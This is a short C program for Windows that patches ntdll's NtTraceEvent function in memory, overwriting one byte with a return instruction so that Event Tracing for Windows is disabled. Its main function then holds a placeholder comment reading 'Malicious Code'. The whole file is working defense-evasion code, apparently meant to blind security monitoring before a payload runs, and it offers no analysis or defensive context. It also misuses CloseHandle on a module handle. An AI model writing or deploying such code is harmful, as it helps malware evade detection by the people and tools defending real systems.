#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

VOID PatchHook(CHAR* address);

VOID CleanUp() {
    HANDLE hDll = LoadLibrary("ntdll.dll");
    FARPROC NtTraceEvent = GetProcAddress(hDll, "NtTraceEvent");

    printf("NtTraceEvent is at 0x%p\n", NtTraceEvent);
    PatchHook((char *)NtTraceEvent);

    
    CloseHandle(hDll);
}

VOID PatchHook(CHAR* address) {

    DWORD dwOld;
    VirtualProtect(address + 3, 1, PAGE_EXECUTE_READWRITE, &dwOld);

    printf("old permission 0x%08x\n", dwOld);
    memcpy(address + 3, "\xc3", 1);
    VirtualProtect(address + 3, 1, dwOld, &dwOld);
}

int main (int argc, char **argv) {
    CleanUp();

    // Malicious Code

    return 0;
}
